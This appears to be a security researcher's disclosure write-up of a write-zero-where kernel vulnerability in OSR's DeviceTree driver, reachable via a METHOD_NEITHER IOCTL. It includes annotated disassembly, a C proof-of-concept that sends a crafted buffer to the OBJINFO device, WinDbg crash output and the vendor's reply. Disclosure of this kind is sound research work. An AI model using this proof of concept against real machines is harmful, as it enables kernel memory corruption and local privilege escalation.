# OSR DeviceTree Local Privilege Escalation

Recently I reported a Write-Zero-Where vulnerability from non-privileged user in DeviceTree to OSRDEV.
I hoped they'd release a fixed version but unfortunately they decided to take the tool off their site.

DeviceTree is a very ancient yet still very useful research tool for both windows researchers and programmers.

## IOCTL 0xCF532013
This is a really simple driver and the vulnerability is really straight forward:

```
.text:FFFFF802248F1D60 ; __int64 __fastcall sub_FFFFF802248F1D60(__int64)
.text:FFFFF802248F1D60 sub_FFFFF802248F1D60 proc near          ; CODE XREF: sub_FFFFF802248F1E70+16E↓p
.text:FFFFF802248F1D60                                         ; DATA XREF: .pdata:FFFFF802248F5060↓o
.text:FFFFF802248F1D60
.text:FFFFF802248F1D60 var_28          = qword ptr -28h
.text:FFFFF802248F1D60 arg_0           = dword ptr  8
.text:FFFFF802248F1D60 arg_8           = qword ptr  10h
.text:FFFFF802248F1D60 arg_10          = qword ptr  18h
.text:FFFFF802248F1D60
.text:FFFFF802248F1D60                 mov     [rsp+arg_8], rbx
.text:FFFFF802248F1D65                 mov     [rsp+arg_10], rbp
.text:FFFFF802248F1D6A                 push    rsi
.text:FFFFF802248F1D6B                 push    rdi
.text:FFFFF802248F1D6C                 push    r12
.text:FFFFF802248F1D6E                 sub     rsp, 30h
.text:FFFFF802248F1D72                 mov     rsi, [rcx]
.text:FFFFF802248F1D75                 mov     r8d, [rcx+10h]
.text:FFFFF802248F1D79                 mov     rdx, [rcx+8]
.text:FFFFF802248F1D7D                 mov     rbx, rcx
.text:FFFFF802248F1D80                 mov     rcx, rsi
.text:FFFFF802248F1D83                 call    sub_FFFFF802248F1A38
.text:FFFFF802248F1D88                 mov     rdi, [rbx+28h]  ; Type3InputBuffer
.text:FFFFF802248F1D8C                 mov     ebp, [rbx+30h]  ; Type3InputBuffer
.text:FFFFF802248F1D8F                 xor     r12d, r12d
.text:FFFFF802248F1D92                 mov     [rsp+48h+arg_0], r12d
.text:FFFFF802248F1D97                 cmp     rdi, r12
.text:FFFFF802248F1D9A                 jz      short pre_exit
.text:FFFFF802248F1D9C                 cmp     ebp, r12d
.text:FFFFF802248F1D9F                 jz      short pre_exit
.text:FFFFF802248F1DA1                 mov     r8, rbp         ; controlled
.text:FFFFF802248F1DA4                 xor     edx, edx        ; zero :)
.text:FFFFF802248F1DA6                 mov     rcx, rdi        ; controlled
.text:FFFFF802248F1DA9                 call    memset
.text:FFFFF802248F1DAE                 cmp     rsi, r12        ; controlled, we can skip that
.text:FFFFF802248F1DB1                 jz      short pre_exit
.text:FFFFF802248F1DB3                 cmp     word ptr [rsi], 3
.text:FFFFF802248F1DB7                 jnz     short pre_exit
.text:FFFFF802248F1DB9                 lea     rax, [rsp+48h+arg_0]
.text:FFFFF802248F1DBE                 lea     edx, [r12+1]    ; DeviceProperty
.text:FFFFF802248F1DC3                 mov     r9, rdi         ; PropertyBuffer
.text:FFFFF802248F1DC6                 mov     r8d, ebp        ; BufferLength
.text:FFFFF802248F1DC9                 mov     rcx, rsi        ; DeviceObject
.text:FFFFF802248F1DCC                 mov     [rsp+48h+var_28], rax ; ResultLength
.text:FFFFF802248F1DD1                 call    cs:IoGetDeviceProperty
.text:FFFFF802248F1DD7                 cmp     eax, r12d
.text:FFFFF802248F1DDA                 jl      short loc_FFFFF802248F1DE3
.text:FFFFF802248F1DDC                 cmp     [rsp+48h+arg_0], r12d
.text:FFFFF802248F1DE1                 jnz     short pre_exit
```
The function deals with `METHOD_NEITHER` buffer and does not properly validates the user input:

```
2: kd> !ioctldecode 0xCF532013

Unknown IOCTL  : 0xcf532013 

Device Type    : 0xcf53
Method         : 0x3 METHOD_NEITHER 
Access         : FILE_ANY_ACCESS
Function       : 0x804
```
On the entry of the function `rcx` points to CurrentStackLocation->Parameters.DeviceIoControl.Type3InputBuffer and as can be seen it passes arbitrary data to `memset` which in turn leads to write-zero-where vulnerability.

As can be noticed, there are certain conditions that we need to avoid but since we control the whole input we can do so.

Note: This driver contains more IOCTL handlers and may contain more vulnerabilities that I haven't looked at. Due to lack of time/interest.

## POC

```
	hDevice = CreateFileA("\\\\.\\OBJINFO", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("getlasterror: %d", GetLastError());
	}

	PUCHAR a = (PUCHAR)malloc(SIZE);
	memset(a, 0x00, SIZE);


	*((unsigned long long*)((unsigned char*)a + 0)) = NULL;//garbage
	*((unsigned long long *)((unsigned char*)a + 40)) = 0x4141414141414141;//where
	*((unsigned int *)((unsigned char*)a + 48)) = 10;//size

	bResult = DeviceIoControl(hDevice, 0xCF532013, a, SIZE, a, SIZE, &junk, 0);
```

WINDBG output:
```
CONTEXT:  ffffbf8a2c2f4700 -- (.cxr 0xffffbf8a2c2f4700)
rax=4141414141414141 rbx=0000020db64080d0 rcx=4141414141414141
rdx=0000000000000000 rsi=0000000000000000 rdi=4141414141414141
rip=fffff802248f2190 rsp=ffffbf8a2c2f5108 rbp=000000000000000a
 r8=0000000000000002  r9=0000000000000001 r10=fffff802248f1e70
r11=ffffbf8a2c2f5100 r12=0000000000000000 r13=0000000000000000
r14=ffffce83fb411a50 r15=ffffce83fa121a70
iopl=0         nv up ei pl nz na pe nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00050202
objinfo+0x2190:
fffff802`248f2190 488911          mov     qword ptr [rcx],rdx ds:002b:41414141`41414141=????????????????
```


## Takeway

As security researchers and programmers we need to be careful with the tools we use and take risks and security vulnerabilities into consideration when using a tool.


## OSR's resposne

```
The product referenced hasn't been updated in 10 years - and in fact, has always been an unsupported utility. The rather ancient, archived site where this utility is still hosted advises folks as follows (link HERE):

<screenshot>

To close the loop, we're going to go off (as I write this) and attempt to formally pull the utility from the site.

Thanks for getting in touch. Feel free to use me as a contact for any future issues - I don't directly support our products, not being a dev, but I would know who internally to turn to for assistance.
```
